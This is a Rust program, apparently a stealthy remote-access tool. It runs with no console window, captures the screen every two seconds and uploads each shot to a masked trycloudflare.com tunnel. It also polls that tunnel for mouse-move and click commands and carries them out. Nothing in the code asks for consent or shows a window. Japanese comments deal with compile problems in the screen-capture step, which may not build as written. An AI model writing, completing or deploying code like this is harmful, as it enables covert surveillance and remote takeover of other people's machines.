#![windows_subsystem = "windows"]

use anyhow::Result;
use enigo::{Enigo, MouseButton, MouseControllable};
use reqwest::blocking::{multipart, Client};
use serde::{Deserialize, Serialize};
use screenshots::Screen;
use std::time::Duration;
use std::io::Cursor;

const BASE_URL: &str = "https://********.trycloudflare.com";

#[derive(Deserialize, Serialize, Debug)]
struct RemoteCommand {
    x: i32,
    y: i32,
    action: String,
}

fn main() -> Result<()> {
    let client = Client::builder().timeout(Duration::from_secs(5)).build()?;
    let mut enigo = Enigo::new();

    loop {
        if let Ok(screens) = Screen::all() {
            if let Some(screen) = screens.first() {
                if let Ok(image) = screen.capture() {
                    // --- 0.8.10 最終解決策 ---
                    // .buffer() も .rgba() も使わず、
                    // image 構造体から直接 Vec<u8> を取り出す試み
                    let width = image.width();
                    let height = image.height();
                    
                    // screenshots 0.8.10 では Image 型は Deref<Target = [u8]> を実装しているか、
                    // もしくは .raw_rgba() という名前である可能性が高いです。
                    // ここでは「&image[..]」で直接バイト列として扱います。
                    let rgba_raw = image.to_vec(); // これが通らない場合は &image[..].to_vec()

                    let mut png_data: Vec<u8> = Vec::new();
                    if let Some(img_buffer) = image::ImageBuffer::<image::Rgba<u8>, _>::from_raw(width, height, rgba_raw) {
                        let dynamic_img = image::DynamicImage::ImageRgba8(img_buffer);
                        let mut writer = Cursor::new(&mut png_data);
                        if let Ok(_) = dynamic_img.write_to(&mut writer, image::ImageFormat::Png) {
                            let _ = upload_image(&client, png_data);
                        }
                    }
                }
            }
        }

        let cmd_url = format!("{}/get_command", BASE_URL);
        if let Ok(res) = client.get(&cmd_url).send() {
            if let Ok(Some(cmd)) = res.json::<Option<RemoteCommand>>() {
                enigo.mouse_move_to(cmd.x, cmd.y);
                if cmd.action == "click" {
                    enigo.mouse_click(MouseButton::Left);
                }
            }
        }
        std::thread::sleep(Duration::from_secs(2));
    }
}

fn upload_image(client: &Client, data: Vec<u8>) -> Result<()> {
    let url = format!("{}/upload", BASE_URL);
    let form = multipart::Form::new().part("file", multipart::Part::bytes(data).file_name("s.png"));
    client.post(&url).multipart(form).send()?;
    Ok(())
}
